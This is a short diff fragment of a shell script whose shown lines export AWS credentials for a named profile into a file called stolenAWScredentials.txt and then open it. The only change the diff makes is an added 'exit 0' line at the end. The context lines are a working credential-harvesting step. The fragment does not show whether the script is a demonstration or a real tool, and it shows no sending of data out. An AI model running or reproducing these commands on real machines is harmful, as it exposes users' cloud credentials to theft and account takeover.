@@ -17,3 +17,4 @@ echo "Stolen credentials:" >> ./stolenAWScredentials.txt
 aws configure export-credentials --profile "$profile" >> ./stolenAWScredentials.txt
 
 open ./stolenAWScredentials.txt
+exit 0
